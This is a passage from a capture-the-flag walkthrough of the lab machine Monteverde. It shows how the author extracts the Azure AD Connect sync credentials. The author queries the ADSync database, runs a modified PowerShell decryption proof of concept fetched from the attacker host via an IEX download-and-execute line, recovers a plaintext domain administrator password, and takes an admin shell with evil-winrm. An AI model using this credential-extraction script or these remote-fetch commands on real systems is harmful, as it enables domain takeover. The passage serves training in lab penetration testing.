                    ProductVersion:   1.1.882.0
                    Debug:            False
                    Patched:          False
                    PreRelease:       False
                    PrivateBuild:     False
                    SpecialBuild:     False
                    Language:         English (United States)

BaseName          : miiserver
Target            : {}
LinkType          :
Name              : miiserver.exe
Length            : 2556984
DirectoryName     : C:\Program Files\Microsoft Azure AD Sync\Bin
Directory         : C:\Program Files\Microsoft Azure AD Sync\Bin
IsReadOnly        : False
Exists            : True
FullName          : C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe
Extension         : .exe
CreationTime      : 8/31/2018 4:53:58 PM
CreationTimeUtc   : 8/31/2018 11:53:58 PM
LastAccessTime    : 1/2/2020 2:53:28 PM
LastAccessTimeUtc : 1/2/2020 10:53:28 PM
LastWriteTime     : 8/31/2018 4:53:58 PM
LastWriteTimeUtc  : 8/31/2018 11:53:58 PM
Attributes        : Archive
```

Searching online reveals the [adconnectdump tool](https://github.com/dirkjanm/adconnectdump), that can be used to extract the password for the AD Connect Sync Account. The repo mentions that the way that AD connect stores credentials changed a while back. The new version stores credentials using DPAPI and the old version used the Registry. [The current version of AD Connect](https://www.microsoft.com/en-us/download/details.aspx?id=47594) at the time of writing is `1.5.30.0`, so the version on the server is unlikely to use DPAPI. This tool works for newer versions of the AD Connect that use DPAPI.

Some further searching reveals [this blog post](https://blog.xpnsec.com/azuread-connect-for-redteam/), which is recommended reading.

`netstat.exe -no`:
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    10.10.10.172:135       10.10.10.172:58277     ESTABLISHED     888
  TCP    10.10.10.172:1433      10.10.10.172:49709     ESTABLISHED     3596 🔍
  TCP    10.10.10.172:1433      10.10.10.172:49710     ESTABLISHED     3596 🔍
  TCP    10.10.10.172:1433      10.10.10.172:49711     ESTABLISHED     3596 🔍
  TCP    10.10.10.172:1433      10.10.10.172:49712     ESTABLISHED     3596 🔍
  TCP    10.10.10.172:1433      10.10.10.172:49713     ESTABLISHED     3596 🔍
  TCP    10.10.10.172:5985      10.10.14.22:41660      TIME_WAIT       0
  TCP    10.10.10.172:5985      10.10.14.22:53048      TIME_WAIT       0
  TCP    10.10.10.172:5985      10.10.14.22:56914      TIME_WAIT       0
  TCP    10.10.10.172:5985      10.10.14.22:56926      ESTABLISHED     4
  TCP    10.10.10.172:5985      10.10.14.22:59246      TIME_WAIT       0
  TCP    10.10.10.172:49667     10.10.10.172:58278     ESTABLISHED     628
  TCP    10.10.10.172:49709     10.10.10.172:1433      ESTABLISHED     3152
  TCP    10.10.10.172:49710     10.10.10.172:1433      ESTABLISHED     3152
  TCP    10.10.10.172:49711     10.10.10.172:1433      ESTABLISHED     3152
  TCP    10.10.10.172:49712     10.10.10.172:1433      ESTABLISHED     3152
  TCP    10.10.10.172:49713     10.10.10.172:1433      ESTABLISHED     3152
  TCP    10.10.10.172:58277     10.10.10.172:135       ESTABLISHED     3152
  TCP    10.10.10.172:58278     10.10.10.172:49667     ESTABLISHED     3152
  TCP    [::1]:389              [::1]:49677            ESTABLISHED     628
  TCP    [::1]:389              [::1]:49678            ESTABLISHED     628
  TCP    [::1]:389              [::1]:52584            ESTABLISHED     628
  TCP    [::1]:49677            [::1]:389              ESTABLISHED     2828
  TCP    [::1]:49678            [::1]:389              ESTABLISHED     2828
  TCP    [::1]:52584            [::1]:389              ESTABLISHED     2616

[...]
```

Instead, we can use the native SQL Server utility `sqlcmd.exe` to extract the values from the database.

`sqlcmd.exe -Q 'select * from sys.databases'`:
```
name                                                                                                                             database_id source_database_id owner_sid                    
                                                                                                                                                create_date             compatibility_level c
ollation_name                                                                                                                   user_access user_access_desc                                 
            is_read_only is_auto_close_on is_auto_shrink_on state state_desc                                                   is_in_standby is_cleanly_shutdown is_supplemental_logging_enab
led snapshot_isolation_state snapshot_isolation_state_desc                                is_read_committed_snapshot_on recovery_model recovery_model_desc  

[...]
```

`sqlcmd.exe -Q 'select name,create_date from sys.databases'`:
```
name                                                                                                                             create_date
-------------------------------------------------------------------------------------------------------------------------------- -----------------------
master                                                                                                                           2003-04-08 09:13:36.390
tempdb                                                                                                                           2024-11-08 03:34:37.787
model                                                                                                                            2003-04-08 09:13:36.390
msdb                                                                                                                             2017-08-22 19:39:22.887
ADSync                                                                                                                           2020-01-02 14:53:29.783 🔍

(5 rows affected)
```

`sqlcmd.exe -d ADSync -Q "SELECT name FROM sys.tables"`:
```
name
--------------------------------------------------------------------------------------------------------------------------------
mms_metaverse
mms_metaverse_lineageguid
mms_metaverse_lineagedate
mms_connectorspace
mms_cs_object_log
mms_cs_link
mms_management_agent 🔍
mms_synchronization_rule
mms_csmv_link
mms_metaverse_multivalue
mms_mv_link
mms_partition
mms_watermark_history
mms_run_history
mms_run_profile
mms_server_configuration 🔍
mms_step_history
mms_step_object_details

(18 rows affected)
```

The database supports the Azure AD Sync service by storing metadata and configuration data for the service. Searching we can see a table named `mms_management_agent` which contains a number of fields including `private_configuration_xml`. The XML within this field holds details regarding the `MSOL` user.

`sqlcmd.exe -d ADSync -Q "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'mms_management_agent'"`:
```
COLUMN_NAME
--------------------------------------------------------------------------------------------------------------------------------
ma_id
ma_name
ma_type
subtype
ma_listname
company_name
version_number
internal_version_number
creation_date
modification_date
capabilities_mask
ma_export_type
current_run_number
key_id
ma_description
ui_settings_xml
ma_extension_xml
ma_schema_xml
attribute_inclusion_xml
controller_configuration_xml
controller_configuration_password
private_configuration_xml 🔍
encrypted_configuration 🔍
dn_construction_xml
component_mappings_xml
full_import_required
full_sync_required

(27 rows affected)
```

`sqlcmd.exe -d ADSync -Q "SELECT private_configuration_xml FROM mms_management_agent"`:
```
private_configuration_xml
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<MAConfig>
      <primary_class_mappings>
        <mapping>
          <primary_class>contact</primary_class>
          <oc-value>contact</oc-value>
        </mapping>
        <mapping>
          <primary_class>device</primary_class>
          <oc-v
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user> 📌
 <forest-login-domain>MEGABANK.LOCAL

(2 rows affected)
```

`sqlcmd.exe -d ADSync -Q "SELECT encrypted_configuration FROM mms_management_agent"`:
```
encrypted_configuration
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
8AAAAAgAAACfn4Lemwuy/a+hBmbvJMeKVf/3ScxlxjHq9eM7Gjy2YLrrsqeRUZh51ks9Dt6BFTSd8OdCHG209rYsFX6f5Az4ZdpscNYSncIaEaI4Re4qw4vNPSIb3DXX6FDtfQHF97fVDV6wp4e3XTni1Y/DEATO+fgJuveCSDf+lX0UNnQEGrTfdDY9sK5neJ5vquLr0pdobAI6vU2g55IrwahGfKmwFjWF5q+qJ3zGR1nfxgsc0xRUNY2xWKoz
8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g

(2 rows affected)
```

In this case, as it was a custom install, it seems the primary domain administrator was used for this. It's worth noting that a default installation uses the `NT SERVICE\ADSync` service account.
 
As you will see however, the password is omitted from the XML returned. The encrypted password is actually stored within another field, `encrypted_configuration`. Looking through the handling of this encrypted data within the connector service, we see a number of references to an assembly of `C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll` which is responsible for key management and the decryption of this data.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`echo '8AAAAAgAAACfn4Lemwuy/a+hBmbvJMeKVf/3ScxlxjHq9eM7Gjy2YLrrsqeRUZh51ks9Dt6BFTSd8OdCHG209rYsFX6f5Az4ZdpscNYSncIaEaI4Re4qw4vNPSIb3DXX6FDtfQHF97fVDV6wp4e3XTni1Y/DEATO+fgJuveCSDf+lX0UNnQEGrTfdDY9sK5neJ5vquLr0pdobAI6vU2g55IrwahGfKmwFjWF5q+qJ3zGR1nfxgsc0xRUNY2xWKoz8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g' | base64 -d | xxd`:
```
00000000: f000 0000 0800 0000 9f9f 82de 9b0b b2fd  ................
00000010: afa1 0666 ef24 c78a 55ff f749 cc65 c631  ...f.$..U..I.e.1
00000020: eaf5 e33b 1a3c b660 baeb b2a7 9151 9879  ...;.<.`.....Q.y
00000030: d64b 3d0e de81 1534 9df0 e742 1c6d b4f6  .K=....4...B.m..
00000040: b62c 157e 9fe4 0cf8 65da 6c70 d612 9dc2  .,.~....e.lp....
00000050: 1a11 a238 45ee 2ac3 8bcd 3d22 1bdc 35d7  ...8E.*...="..5.
00000060: e850 ed7d 01c5 f7b7 d50d 5eb0 a787 b75d  .P.}......^....]
00000070: 39e2 d58f c310 04ce f9f8 09ba f782 4837  9.............H7
00000080: fe95 7d14 3674 041a b4df 7436 3db0 ae67  ..}.6t....t6=..g
00000090: 789e 6faa e2eb d297 686c 023a bd4d a0e7  x.o.....hl.:.M..
000000a0: 922b c1a8 467c a9b0 1635 85e6 afaa 277c  .+..F|...5....'|
000000b0: c647 59df c60b 1cd3 1454 358d b158 aa33  .GY......T5..X.3
000000c0: f000 0000 0800 0000 5084 2041 9f04 e975  ........P. A...u
000000d0: f404 eae3 4978 9586 8efa 6cd3 cb24 0033  ....Ix....l..$.3
000000e0: 890e a33b e21c 37f6 b556 316a d0ba 42c0  ...;..7..V1j..B.
000000f0: 118a 5faa e936 0a09 6a1c 9dc6 7f1c cd5a  .._..6..j......Z
00000100: 5b7d fa06 bedb 0996 034c c777 7b86 0fcb  [}.......L.w{...
00000110: e4fe f7e7 b05d e9d9 a289 ee7f 4800 1e75  .....]......H..u
00000120: c637 b442 b0cb 35d3 aa3b 1a1d f27e d57b  .7.B..5..;...~.{
00000130: 26cd 5bfd 64f9 85ae 6248 840f 7c4e f0fc  &.[.d...bH..|N..
00000140: 9eef 68ba 0fd7 3941 3ce3 4e55 dee6 a81d  ..h...9A<.NU....
00000150: e130 9da7 87e6 55df 9494 bfdd 593f e684  .0....U.....Y?..
00000160: 91ef 7bf7 7dcc 5af6 117e 6be7 ed53 2db2  ..{.}.Z..~k..S-.
00000170: 42cd 8507 a852 efbe 909d d6b2 44af af20  B....R......D.. 
```

The mentioned blog post details the exploitation process for the older version of AD Connect. Copy the script from the blog post and save it locally. Attempting to run this as is was not successful.

Let's try to extract the `instance_id`, `keyset_id` and `entropy` values from the database manually. A default installation of AD Connect uses a SQL Server Express instance as a LocalDB, connecting over a named pipe. However, enumeration of `C:\Program Files` and `netstat` reveals that Microsoft SQL Server is installed and bound to `10.10.10.172` (but isn't accessible externally). So this seems to have been a custom install of AD Connect.

`sqlcmd.exe -d ADSync -Q "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'mms_server_configuration'"`:
```
COLUMN_NAME
--------------------------------------------------------------------------------------------------------------------------------
instance_id 🔍
fixed_schema_version_number
server_configuration_version_number
keyset_id 🔍
mms_timestamp
operation_bitmask
administrators_sid
operators_sid
browse_sid
passwordset_sid
mv_schema_xml
parameters
entropy 🔍

(13 rows affected)
```

`sqlcmd.exe -d ADSync -Q "SELECT instance_id,keyset_id,entropy FROM mms_server_configuration"`:
```
instance_id                          keyset_id   entropy
------------------------------------ ----------- ------------------------------------
1852B527-DD4F-4ECF-B541-EFCCBFF29E31           1 194EC2FC-F186-46CF-B44D-071EB61F49CD

(1 rows affected)
```

To decrypt the `encrypted_configuration` value the blog post author created a quick POC which will retrieve the keying material from the LocalDB instance before passing it to the `mcrypt.dll` assembly to decrypt.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`curl https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/d45633c954ee3d40be1bff82648750f516cd3b80/azuread_decrypt_msol.ps1 -o ./azuread_decrypt.ps1`:
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1740  100  1740    0     0   3721      0 --:--:-- --:--:-- --:--:--  3725
```

`cat ./azuread_decrypt.ps1`:
```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

Modify the script to set the `$key_id`, `$instance_id` and `$entropy` variables to the values we extracted from the database, and remove the commands that try to obtain them automatically. Next we will need to modify the existing $client variable to reference the custom SQL Server. Let's encapsulate the script in a function that we can call.

`vim ./azuread_decrypt.ps1`:
```powershell
$key_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"

$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList `
    "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"

Function Get-ADConnectPassword {
    Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
    
    $client.Open()
    
    $cmd = $client.CreateCommand()
    $cmd.CommandText = @"
SELECT private_configuration_xml, encrypted_configuration
FROM mms_management_agent
WHERE ma_type = 'AD'
"@
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null

    $config = $reader.GetString(0)
    $crypted = $reader.GetString(1)
    $reader.Close()

    Add-Type -Path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'

    $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)

    $key = $null
    $km.GetActiveCredentialKey([ref]$key)

    $key2 = $null
    $km.GetKey(1, [ref]$key2)

    $decrypted = $null
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)

    $domain = Select-Xml -Content $config -XPath "//parameter[@name='forest-login-domain']" |
        Select-Object @{Name = 'Domain'; Expression = { $_.Node.InnerXML }}

    $username = Select-Xml -Content $config -XPath "//parameter[@name='forest-login-user']" |
        Select-Object @{Name = 'Username'; Expression = { $_.Node.InnerXML }}

    $password = Select-Xml -Content $decrypted -XPath "//attribute" |
        Select-Object @{Name = 'Password'; Expression = { $_.Node.InnerXML }}

    Write-Host ("Domain: " + $domain.Domain)
    Write-Host ("Username: " + $username.Username)
    Write-Host ("Password: " + $password.Password)
}
```

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![Victim: mhope](https://custom-icon-badges.demolab.com/badge/Victim-mhope-64b5f6?logo=windows11&logoColor=white)

`IEX(new-object net.webclient).downloadstring('http://10.10.14.22/azuread_decrypt.ps1')`

`Get-ADConnectPassword`:
```
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator 🔑
Password: d0m@in4dminyeah! 🔑
```

This was successful, and we have obtained credentials for the AD Connect Sync account.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`netexec smb 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!) 📌
```

`netexec smb 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!' --shares`:
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!)
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$          READ,WRITE      Remote Admin 📌
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$              READ,WRITE      Default share
SMB         10.10.10.172    445    MONTEVERDE       E$              READ,WRITE      Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ,WRITE      Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ,WRITE
```

`netexec winrm 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'`:
```
WINRM       10.10.10.172    5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!) 📌
```

`evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
megabank\administrator
```

`cd C:\Users\Administrator\Desktop`

`dir`:
```
    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/9/2024   2:02 AM             34 root.txt
```

`type root.txt`:
```
8376c*************************** 🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
